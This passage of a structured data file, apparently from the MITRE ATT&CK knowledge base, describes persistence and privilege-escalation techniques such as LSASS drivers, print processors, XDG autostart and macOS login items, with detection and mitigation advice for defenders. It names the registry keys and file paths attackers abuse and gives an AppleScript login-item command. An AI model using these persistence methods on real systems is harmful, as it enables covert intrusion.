LKMs)</a> LKMs are typically loaded into <code>/lib/modules</code> and have had the extension .ko (\"kernel object\") since version 2.6 of the Linux kernel. <a href=\"https://en.wikipedia.org/wiki/Loadable_kernel_module#Linux\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Loadable Kernel Module)</a>\n\nAdversaries may run commands on the target system before loading a malicious module in order to ensure that it is properly compiled. <a href=\"http://www.megasecurity.org/papers/Rootkits.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: iDefense Rootkit Overview)</a> Adversaries may also execute commands to identify the exact version of the running Linux kernel and/or download multiple versions of the same .ko (kernel object) files to use the one appropriate for the running system. <a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/skidmap-linux-malware-uses-rootkit-capabilities-to-hide-cryptocurrency-mining-payload/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trend Micro Skidmap)</a> Many LKMs require Linux headers (specific to the target kernel) in order to compile properly. These are typically obtained through the operating systems package manager and installed like a normal package. On Ubuntu and Debian based systems this can be accomplished by running: <code>apt-get install linux-headers-$(uname -r)</code> On RHEL and CentOS based systems this can be accomplished by running: <code>yum install kernel-devel-$(uname -r)</code>\n\nOn macOS, monitor for execution of <code>kextload</code> commands and user installed kernel extensions performing abnormal and/or potentially malicious activity (such as creating network connections). Monitor for new rows added in the <code>kext_policy</code> table. KextPolicy stores a list of user approved (non Apple) kernel extensions and a partial history of loaded kernel modules in a SQLite database, <code>/var/db/SystemPolicyConfiguration/KextPolicy</code>. <a href=\"https://pikeralpha.wordpress.com/2017/08/29/user-approved-kernel-extension-loading/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: User Approved Kernel Extension Pike’s)</a> <a href=\"https://richard-purves.com/2017/11/09/mdm-and-the-kextpocalypse-2/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Purves Kextpocalypse 2)</a> <a href=\"https://developer.apple.com/business/documentation/Configuration-Profile-Reference.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple Developer Configuration Profile)</a>","platforms":["macOS","Linux"],"dataSources":["Command: Command Execution","File: File Creation","File: File Modification","Kernel: Kernel Module Load","Process: Process Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Use MDM to disable user's ability to install or approve kernel extensions, and ensure all approved kernel extensions are in alignment with policies specified in <code>com.apple.syspolicy.kernel-extension-policy</code>. <a href=\"https://developer.apple.com/library/archive/technotes/tn2459/_index.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple TN2459 Kernel Extensions)</a> <a href=\"https://developer.apple.com/business/documentation/Configuration-Profile-Reference.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MDMProfileConfigMacOS)</a>"},{"id":"M1026","name":"Privileged Account Management","description":"Limit access to the root account and prevent users from loading kernel modules and extensions through proper privilege separation and limiting Privilege Escalation opportunities."},{"id":"M1038","name":"Execution Prevention","description":"Application control and software restriction tools, such as SELinux, KSPP, grsecurity MODHARDEN, and Linux kernel tuning can aid in restricting kernel module loading. <a href=\"https://patchwork.kernel.org/patch/8754821/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kernel.org Restrict Kernel Module)</a> <a href=\"https://en.wikibooks.org/wiki/Grsecurity/The_RBAC_System\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikibooks Grsecurity)</a> <a href=\"https://www.kernel.org/doc/html/latest/security/self-protection.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kernel Self Protection Project)</a> <a href=\"https://linux-audit.com/increase-kernel-integrity-with-disabled-linux-kernel-modules-loading/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Increasing Linux kernel integrity)</a> <a href=\"https://xorl.wordpress.com/2018/02/17/lkm-loading-kernel-restrictions/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LKM loading kernel restrictions)</a>"},{"id":"M1049","name":"Antivirus/Antimalware","description":"Common tools for detecting Linux rootkits include: rkhunter <a href=\"http://rkhunter.sourceforge.net\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SourceForge rkhunter)</a>, chrootkit <a href=\"http://www.chkrootkit.org/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Chkrootkit Main)</a>, although rootkits may be designed to evade certain detection tools."}]},{"id":"T1547.007","name":"Re-opened Applications","description":"Adversaries may modify plist files to automatically run an application when a user logs in. When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to \"Reopen windows when logging back in\". <a href=\"https://support.apple.com/en-us/HT204005\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Re-Open windows on Mac)</a> When selected, all applications currently open are added to a property list file named <code>com.apple.loginwindow.[UUID].plist</code> within the <code>~/Library/Preferences/ByHost</code> directory. <a href=\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Methods of Mac Malware Persistence)</a> <a href=\"https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wardle Persistence Chapter)</a> Applications listed in this file are automatically reopened upon the user’s next logon.\n\nAdversaries can establish Persistence by adding a malicious application path to the <code>com.apple.loginwindow.[UUID].plist</code> file to execute payloads when a user logs in.","detection":"Monitoring the specific plist files associated with reopening applications can indicate when an application has registered itself to be reopened.","platforms":["macOS"],"dataSources":["Command: Command Execution","File: File Modification"],"mitigations":[{"id":"M1017","name":"User Training","description":"Holding the Shift key while logging in prevents apps from opening automatically. <a href=\"https://support.apple.com/en-us/HT204005\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Re-Open windows on Mac)</a>"},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"This feature can be disabled entirely with the following terminal command: <code>defaults write -g ApplePersistence -bool no</code>."}]},{"id":"T1547.008","name":"LSASS Driver","description":"Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process. <a href=\"https://technet.microsoft.com/library/cc961760.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Security Subsystem)</a>\n\nAdversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., Hijack Execution Flow), an adversary can use LSA operations to continuously execute malicious payloads.","detection":"With LSA Protection enabled, monitor the event logs (Events 3033 and 3063) for failed attempts to load LSA plug-ins and drivers. <a href=\"https://technet.microsoft.com/library/dn408187.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft LSA Protection Mar 2014)</a> Also monitor DLL load operations in lsass.exe. <a href=\"https://msdn.microsoft.com/library/windows/desktop/ff919712.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DLL Security)</a>\n\nUtilize the Sysinternals Autoruns/Autorunsc utility <a href=\"https://technet.microsoft.com/en-us/sysinternals/bb963902\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Autoruns)</a> to examine loaded drivers associated with the LSA.","platforms":["Windows"],"dataSources":["Module: Module Load","File: File Creation","Driver: Driver Load","File: File Modification"],"mitigations":[{"id":"M1025","name":"Privileged Process Integrity","description":"On Windows 8.1 and Server 2012 R2, enable LSA Protection by setting the Registry key <code>HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\RunAsPPL</code> to <code>dword:00000001</code>. <a href=\"https://technet.microsoft.com/library/dn408187.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft LSA Protection Mar 2014)</a> LSA Protection ensures that LSA plug-ins and drivers are only loaded if they are digitally signed with a Microsoft signature and adhere to the Microsoft Security Development Lifecycle (SDL) process guidance."},{"id":"M1043","name":"Credential Access Protection","description":"On Windows 10 and Server 2016, enable Windows Defender Credential Guard <a href=\"https://docs.microsoft.com/windows/access-protection/credential-guard/credential-guard-manage\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Enable Cred Guard April 2017)</a> to run lsass.exe in an isolated virtualized environment without any device drivers. <a href=\"https://docs.microsoft.com/windows/access-protection/credential-guard/credential-guard-how-it-works\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Credential Guard April 2017)</a>"},{"id":"M1044","name":"Restrict Library Loading","description":"Ensure safe DLL search mode is enabled <code>HKEY_LOCAL_MACHINE\\\\System\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\SafeDllSearchMode</code> to mitigate risk that lsass.exe loads a malicious code library. <a href=\"https://msdn.microsoft.com/library/windows/desktop/ff919712.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DLL Security)</a>"}]},{"id":"T1547.009","name":"Shortcut Modification","description":"Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\n\nAdversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence. (Citation: Shortcut for Persistence ) Although often used as payloads in an infection chain (e.g. Spearphishing Attachment), adversaries may also create a new shortcut as a means of indirection, while also abusing Masquerading to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.\n\nShortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. Browser Extensions) to persistently launch malware.","detection":"Since a shortcut's target path likely will not change, modifications to shortcut files that do not correlate with known software changes, patches, removal, etc., may be suspicious. Analysis should attempt to relate shortcut file change or creation events to other potentially suspicious events based on known adversary behavior such as process launches of unknown executables that make network connections.\n\nMonitor for LNK files created with a Zone Identifier value greater than 1, which may indicate that the LNK file originated from outside of the network. <a href=\"https://www.youtube.com/watch?v=nJ0UsyiUEqQ\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BSidesSLC 2020 - LNK Elastic)</a>","platforms":["Windows"],"dataSources":["File: File Modification","Process: Process Creation","File: File Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit Privileges for Shortcut Creation: While the SeCreateSymbolicLinkPrivilege is not directly related to .lnk file creation, you should still enforce least privilege principles by limiting user rights to create and modify shortcuts, especially in system-critical locations. This can be done through GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment: Create symbolic links. <a href=\"https://www.stigviewer.com/stig/windows_server_2008_r2_member_server/2015-06-25/finding/V-26482\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: UCF STIG Symbolic Links)</a>\n\nRegular User Permissions Review: Regularly review and audit user permissions to ensure that only necessary accounts have write access to startup folders and critical system directories."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Applying strict permissions to directories where shortcuts are stored, such as the startup folder, can prevent unauthorized modifications."},{"id":"M1038","name":"Execution Prevention","description":"Prevents malicious shortcuts or LNK files from executing unwanted code by ensuring only authorized applications and scripts are allowed to run."}]},{"id":"T1547.010","name":"Port Monitors","description":"Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the <code>AddMonitor</code> API call to set a DLL to be loaded at startup. <a href=\"http://msdn.microsoft.com/en-us/library/dd183341\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AddMonitor)</a> This DLL can be located in <code>C:\\Windows\\System32</code> and will be loaded and run by the print spooler service, <code>spoolsv.exe</code>, under SYSTEM level permissions on boot. <a href=\"https://www.defcon.org/images/defcon-22/dc-22-presentations/Bloxham/DEFCON-22-Brady-Bloxham-Windows-API-Abuse-UPDATED.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Bloxham)</a> \n\nAlternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to the <code>Driver</code> value of an existing or new arbitrarily named subkey of <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>. The Registry key contains entries for the following:\n\n* Local Port\n* Standard TCP/IP Port\n* USB Monitor\n* WSD Port","detection":"Monitor process API calls to <code>AddMonitor</code>. <a href=\"http://msdn.microsoft.com/en-us/library/dd183341\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AddMonitor)</a> Monitor DLLs that are loaded by spoolsv.exe for DLLs that are abnormal. New DLLs written to the System32 directory that do not correlate with known good software or patching may be suspicious. \n\nMonitor Registry writes to <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>, paying particular attention to changes in the \"Driver\" subkey. Run the Autoruns utility, which checks for this Registry key as a persistence mechanism. <a href=\"https://technet.microsoft.com/en-us/sysinternals/bb963902\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Autoruns)</a>","platforms":["Windows"],"dataSources":["Windows Registry: Windows Registry Key Modification","File: File Creation","Module: Module Load","Process: OS API Execution"],"mitigations":[]},{"id":"T1547.012","name":"Print Processors","description":"Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, <code>spoolsv.exe</code>, during boot. <a href=\"https://learn.microsoft.com/windows-hardware/drivers/print/introduction-to-print-processors\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Intro Print Processors)</a>\n\nAdversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\\SYSTEM\\\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\\\[Windows architecture: e.g., Windows x64]\\Print Processors\\\\[user defined]\\Driver</code> Registry key that points to the DLL.\n\nFor the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the <code>GetPrintProcessorDirectory</code> API call, or referenced via a relative path from this directory. <a href=\"https://docs.microsoft.com/en-us/windows/win32/printdocs/addprintprocessor\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft AddPrintProcessor May 2018)</a> After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run. <a href=\"https://www.welivesecurity.com/2020/05/21/no-game-over-winnti-group/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET PipeMon May 2020)</a>\n\nThe print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.","detection":"Monitor process API calls to <code>AddPrintProcessor</code> and <code>GetPrintProcessorDirectory</code>. New print processor DLLs are written to the print processor directory. Also monitor Registry writes to <code>HKLM\\SYSTEM\\ControlSet001\\Control\\Print\\Environments\\\\[Windows architecture]\\Print Processors\\\\[user defined]\\\\Driver</code> or <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\\\[Windows architecture]\\Print Processors\\\\[user defined]\\Driver</code> as they pertain to print processor installations.\n\nMonitor for abnormal DLLs that are loaded by spoolsv.exe. Print processors that do not correlate with known good software or patching may be suspicious.","platforms":["Windows"],"dataSources":["Windows Registry: Windows Registry Key Modification","File: File Creation","Driver: Driver Load","Module: Module Load","Process: OS API Execution"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit user accounts that can load or unload device drivers by disabling <code>SeLoadDriverPrivilege</code>."}]},{"id":"T1547.013","name":"XDG Autostart Entries","description":"Adversaries may add or modify XDG Autostart Entries to execute malicious programs or commands when a user’s desktop environment is loaded at login. XDG Autostart entries are available for any XDG-compliant Linux system. XDG Autostart entries use Desktop Entry files (<code>.desktop</code>) to configure the user’s desktop environment upon user login. These configuration files determine what applications launch upon user login, define associated applications to open specific file types, and define applications used to open removable media. <a href=\"https://specifications.freedesktop.org/autostart-spec/autostart-spec-latest.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Free Desktop Application Autostart Feb 2006)</a> <a href=\"https://specifications.freedesktop.org/desktop-entry-spec/1.2/ar01s06.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Free Desktop Entry Keys)</a>\n\nAdversaries may abuse this feature to establish persistence by adding a path to a malicious binary or command to the <code>Exec</code> directive in the <code>.desktop</code> configuration file. When the user’s desktop environment is loaded at user login, the <code>.desktop</code> files located in the XDG Autostart directories are automatically executed. System-wide Autostart entries are located in the <code>/etc/xdg/autostart</code> directory while the user entries are located in the <code>~/.config/autostart</code> directory.\n\nAdversaries may combine this technique with Masquerading to blend malicious Autostart entries with legitimate programs. <a href=\"https://redcanary.com/blog/netwire-remote-access-trojan-on-linux/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Red Canary Netwire Linux 2022)</a>","detection":"Malicious XDG autostart entries may be detected by auditing file creation and modification events within the <code>/etc/xdg/autostart</code> and <code>~/.config/autostart</code> directories. Depending on individual configurations, defenders may need to query the environment variables <code>$XDG_CONFIG_HOME</code> or <code>$XDG_CONFIG_DIRS</code> to determine the paths of Autostart entries. Autostart entry files not associated with legitimate packages may be considered suspicious. Suspicious entries can also be identified by comparing entries to a trusted system baseline.\n \nSuspicious processes or scripts spawned in this manner will have a parent process of the desktop component implementing the XDG specification and will execute as the logged on user.","platforms":["Linux"],"dataSources":["File: File Creation","Command: Command Execution","Process: Process Creation","File: File Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit privileges of user accounts so only authorized privileged users can create and modify XDG autostart entries."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict write access to XDG autostart entries to only select privileged users."},{"id":"M1033","name":"Limit Software Installation","description":"Restrict software installation to trusted repositories only and be cautious of orphaned software packages."}]},{"id":"T1547.014","name":"Active Setup","description":"Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer. <a href=\"https://helgeklein.com/blog/2010/04/active-setup-explained/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Klein Active Setup 2010)</a> These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nAdversaries may abuse Active Setup by creating a key under <code> HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\</code> and setting a malicious value for <code>StubPath</code>. This value will serve as the program that will be executed when a user logs into the computer. <a href=\"https://digital-forensics.sans.org/summit-archives/2010/35-glyer-apt-persistence-mechanisms.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant Glyer APT 2010)</a> <a href=\"https://citizenlab.ca/2015/12/packrat-report/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Citizenlab Packrat 2015)</a> <a href=\"https://www.fireeye.com/blog/threat-research/2012/12/council-foreign-relations-water-hole-attack-details.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye CFR Watering Hole 2012)</a> <a href=\"https://securelist.com/whos-really-spreading-through-the-bright-star/68978/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SECURELIST Bright Star 2015)</a> <a href=\"https://unit42.paloaltonetworks.com/unit42-tropic-trooper-targets-taiwanese-government-and-fossil-fuel-provider-with-poison-ivy/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: paloalto Tropic Trooper 2016)</a>\n\nAdversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.","detection":"Monitor Registry key additions and/or modifications to <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\</code>.\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the Active Setup Registry locations and startup folders. <a href=\"https://technet.microsoft.com/en-us/sysinternals/bb963902\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Autoruns)</a> Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.","platforms":["Windows"],"dataSources":["Command: Command Execution","Windows Registry: Windows Registry Key Creation","Process: Process Creation","Windows Registry: Windows Registry Key Modification"],"mitigations":[]},{"id":"T1547.015","name":"Login Items","description":"Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in. <a href=\"https://support.apple.com/guide/mac-help/open-items-automatically-when-you-log-in-mh15189/mac\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Open Login Items Apple)</a> Login items can be added via a shared file list or Service Management Framework. <a href=\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLoginItems.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Adding Login Items)</a> Shared file list login items can be set using scripting languages such as AppleScript, whereas the Service Management Framework uses the API call <code>SMLoginItemSetEnabled</code>.\n\nLogin items installed using the Service Management Framework leverage <code>launchd</code>, are not visible in the System Preferences, and can only be removed by the application that created them. <a href=\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLoginItems.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Adding Login Items)</a> <a href=\"https://blog.timschroeder.net/2013/04/21/smloginitemsetenabled-demystified/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SMLoginItemSetEnabled Schroeder 2013)</a> Login items created using a shared file list are visible in System Preferences, can hide the application when it launches, and are executed through LaunchServices, not launchd, to open applications, documents, or URLs without using Finder. <a href=\"https://developer.apple.com/documentation/coreservices/launch_services\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Launch Services Apple Developer)</a> Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.\n\nAdversaries can utilize AppleScript and Native API calls to create a login item to spawn malicious executables. <a href=\"https://eclecticlight.co/2018/05/22/running-at-startup-when-to-use-a-login-item-or-a-launchagent-launchdaemon/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ELC Running at startup)</a> Prior to version 10.5 on macOS, adversaries can add login items by using AppleScript to send an Apple events to the “System Events” process, which has an AppleScript dictionary for manipulating login items. <a href=\"https://developer.apple.com/library/archive/samplecode/LoginItemsAE/Introduction/Intro.html#//apple_ref/doc/uid/DTS10003788\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Login Items AE)</a> Adversaries can use a command such as <code>tell application “System Events” to make login item at end with properties /path/to/executable</code>. <a href=\"https://eclecticlight.co/2021/09/16/how-to-run-an-app-or-tool-at-startup/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Startup Items Eclectic)</a> <a href=\"http://www.hexed.in/2019/07/osxdok-analysis.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: hexed osx.dok analysis 2019)</a> <a href=\"https://gist.github.com/kaloprominat/6111584\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Add List Remove Login Items Apple Script)</a> This command adds the path of the malicious executable to the login item file list located in <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code>. <a href=\"https://eclecticlight.co/2021/09/16/how-to-run-an-app-or-tool-at-startup/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Startup Items Eclectic)</a> Adversaries can also use login items to launch executables that can be used to control the victim system remotely or as a means to gain privilege escalation by prompting for user credentials. <a href=\"https://objective-see.com/blog/blog_0x25.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: objsee mac malware 2017)</a> <a href=\"https://blog.checkpoint.com/2017/04/27/osx-malware-catching-wants-read-https-traffic/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CheckPoint Dok)</a> <a href=\"https://objective-see.com/blog/blog_0x44.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: objsee netwire backdoor 2019)</a>","detection":"All login items created via shared file lists are viewable by using the System Preferences GUI or in the <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code> file. <a href=\"https://support.apple.com/guide/mac-help/open-items-automatically-when-you-log-in-mh15189/mac\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Open Login Items Apple)</a> <a href=\"https://eclecticlight.co/2021/09/16/how-to-run-an-app-or-tool-at-startup/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Startup Items Eclectic)</a> <a href=\"https://objective-see.com/blog/blog_0x31.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: objsee block blocking login items)</a> <a href=\"https://www.sentinelone.com/blog/how-malware-persists-on-macos/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: sentinelone macos persist Jun 2019)</a> These locations should be monitored and audited for known good applications.\n\nOtherwise, login Items are located in <code>Contents/Library/LoginItems</code> within an application bundle, so these paths should be monitored as well. <a href=\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLoginItems.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Adding Login Items)</a> Monitor applications that leverage login items with either the LSUIElement or LSBackgroundOnly key in the Info.plist file set to true. <a href=\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLoginItems.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Adding Login Items)</a> <a href=\"https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Articles/LaunchServicesKeys.html#//apple_ref/doc/uid/TP40009250-SW1\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Launch Service Keys Developer Apple)</a>\n\nMonitor processes that start at login for unusual or unknown applications. Usual applications for login items could include what users add to configure their user environment, such as email, chat, or music applications, or what administrators include for organization settings and protections. Check for running applications from login items that also have abnormal behavior,, such as establishing network connections.","platforms":["macOS"],"dataSources":["Process: Process Creation","File: File Creation","File: File Modification"],"mitigations":[]}]},{"id":"T1548","name":"Abuse Elevation Control Mechanism","description":"Adversaries may circumvent mechanisms designed to control privilege elevation to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. <a href=\"https://technet.microsoft.com/en-us/itpro/windows/keep-secure/how-user-account-control-works\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet How UAC Works)</a> <a href=\"https://www.sudo.ws/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: sudo man page 2018)</a> An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system. <a href=\"https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OSX Keydnap malware)</a> <a href=\"https://blog.fortinet.com/2016/12/16/malicious-macro-bypasses-uac-to-elevate-privilege-for-fareit-malware\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Fortinet Fareit)</a>","detection":"Monitor the file system for files that have the setuid or setgid bits set. Also look for any process API calls for behavior that may be indicative of Process Injection and unusual loaded DLLs through DLL Search Order Hijacking, which indicate attempts to gain access to higher privileged processes. On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo).\n\nConsider monitoring for <code>/usr/libexec/security_authtrampoline</code> executions which may indicate that AuthorizationExecuteWithPrivileges is being executed. MacOS system logs may also indicate when AuthorizationExecuteWithPrivileges is being called. Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling.\n\nOn Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo). This technique is abusing normal functionality in macOS and Linux systems, but sudo has the ability to log all input and output based on the <code>LOG_INPUT</code> and <code>LOG_OUTPUT</code> directives in the <code>/etc/sudoers</code> file.\n\nThere are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Some UAC bypass methods rely on modifying specific, user-accessible Registry settings. Analysts should monitor Registry settings for unauthorized changes.","platforms":["Linux","macOS","Windows","IaaS","Office Suite","Identity Provider"],"dataSources":["Process: Process Creation","User Account: User Account Modification","Command: Command Execution","Process: OS API Execution","File: File Modification","Process: Process Metadata","File: File Metadata","Windows Registry: Windows Registry Key Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit the privileges of cloud accounts to assume, create, or impersonate additional roles, policies, and permissions to only those required. Where just-in-time access is enabled, consider requiring manual approval for temporary elevation of privileges."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"The sudoers file should be strictly edited such that passwords are always required and that users can't spawn risky processes as users with higher privilege."},{"id":"M1026","name":"Privileged Account Management","description":"Remove users from the local administrator group on systems.\n\nBy requiring a password, even if an adversary can get terminal access, they must know the password to run anything in the sudoers file. Setting the timestamp_timeout to 0 will require the user to input their password every time sudo is executed."},{"id":"M1028","name":"Operating System Configuration","description":"Applications with known vulnerabilities or known shell escapes should not have the setuid or setgid bits set to reduce potential damage if an application is compromised. Additionally, the number of programs with setuid or setgid bits set should be minimized across a system. Ensuring that the sudo tty_tickets setting is enabled will prevent this leakage across tty sessions."},{"id":"M1038","name":"Execution Prevention","description":"System settings can prevent applications from running that haven't been downloaded from legitimate repositories which may help mitigate some of these issues. Not allowing unsigned applications from being run may also mitigate some risk."},{"id":"M1047","name":"Audit","description":"Check for common UAC bypass weaknesses on Windows systems to be aware of the 